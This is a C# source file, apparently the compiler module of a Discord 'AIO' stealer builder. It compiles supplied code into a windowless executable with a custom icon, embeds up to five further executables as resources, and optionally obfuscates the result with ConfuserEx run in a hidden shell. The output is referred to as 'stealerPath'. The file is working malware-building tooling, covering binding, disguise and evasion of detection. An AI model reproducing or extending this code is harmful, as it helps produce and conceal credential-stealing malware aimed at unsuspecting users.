using Microsoft.CSharp;
using Microsoft.VisualBasic;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Windows.Forms;

namespace discordAIO6 
{
    internal class Compiler
    {
        public static bool Compilation(string source_code, string output_name, bool obfuscateMe, string icon_path = null, bool stExe = false, bool ndExe = false, bool rdExe = false, bool thExe = false, bool fthExe = false, string stringExe1 = null, string stringExe2 = null, string stringExe3 = null, string stringExe4 = null, string stringExe5 = null)
        {
            string iconpath = Environment.CurrentDirectory + "\\icon.ico";
            Dictionary<string, string> dictionary = new Dictionary<string, string>();
            dictionary.Add("CompilerVersion", "v4.0");
            string compileOptions = "/target:winexe /platform:anycpu /optimize";

            if (icon_path != null)
            {
                File.Copy(icon_path, iconpath, true);
                compileOptions = compileOptions + " /win32icon:\"" + iconpath + "\"";
            }
            bool result;

            using (CSharpCodeProvider csCodeProvider = new CSharpCodeProvider(dictionary))
            {
                var parameters = new CompilerParameters()
                {
                    GenerateExecutable = true,
                    GenerateInMemory = false,
                    OutputAssembly = output_name,
                    CompilerOptions = compileOptions,
                    TreatWarningsAsErrors = false,
                    IncludeDebugInformation = false
                };
                parameters.ReferencedAssemblies.Add("System.dll");
                parameters.ReferencedAssemblies.Add("System.Net.dll");
                parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                parameters.ReferencedAssemblies.Add("System.Drawing.dll");
                parameters.ReferencedAssemblies.Add("System.Management.dll");
                parameters.ReferencedAssemblies.Add("System.IO.dll");
                parameters.ReferencedAssemblies.Add("System.IO.compression.dll");
                parameters.ReferencedAssemblies.Add("System.IO.compression.filesystem.dll");
                parameters.ReferencedAssemblies.Add("System.Core.dll");
                parameters.ReferencedAssemblies.Add("System.Security.dll");
                parameters.ReferencedAssemblies.Add("System.Net.Http.dll");
                parameters.ReferencedAssemblies.Add("System.Xml.dll");

                if (csCodeProvider.Supports(GeneratorSupport.Resources))
                {
                    if (stExe)
                    {
                        parameters.EmbeddedResources.Add(stringExe1);
                    }
                    if (ndExe)
                    {
                        parameters.EmbeddedResources.Add(stringExe2);
                    }
                    if (rdExe)
                    {
                        parameters.EmbeddedResources.Add(stringExe3);
                    }
                    if (thExe)
                    {
                        parameters.EmbeddedResources.Add(stringExe4);
                    }
                    if (fthExe)
                    {
                        parameters.EmbeddedResources.Add(stringExe5);
                    }
                }

                CompilerResults compResults = csCodeProvider.CompileAssemblyFromSource(parameters, new string[] { source_code });
                if (compResults.Errors.HasErrors)
                {
                    MessageBox.Show(string.Format("The compiler has encountered {0} errors", compResults.Errors.Count), "Errors while compiling", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    foreach (object obj in compResults.Errors)
                    {
                        CompilerError compilerError = (CompilerError)obj;
                        MessageBox.Show(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", new object[]
                        {
                            compilerError.ErrorText,
                            compilerError.Line,
                            compilerError.Column,
                            compilerError.FileName
                        }), "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    }
                }
                else
                {
                    if (obfuscateMe)
                    {
                        Confuser(output_name);
                    }
                }
                File.Delete(iconpath);
                result = (compResults.Errors.Count == 0);
            }
           return result;
        }

        private static void Confuser(string file)
        {
            File.WriteAllBytes(Path.GetTempPath() + "confuser.zip", Properties.Resources.ConfuserEx);

            if (Directory.Exists(Path.GetTempPath() + "Confuser"))
            {
                Directory.Delete(Path.GetTempPath() + "Confuser", true);
                Directory.CreateDirectory(Path.GetTempPath() + "Confuser");
            }

            ZipFile.ExtractToDirectory(Path.GetTempPath() + "confuser.zip", Path.GetTempPath() + "Confuser");

            string stealerPath = Path.GetFullPath(file);

            Interaction.Shell(Path.GetTempPath() + @"Confuser\Confuser.CLI.exe -n " + stealerPath, AppWinStyle.Hide, true);

            File.Delete(Path.GetTempPath() + "confuser.zip");
        }
    }
}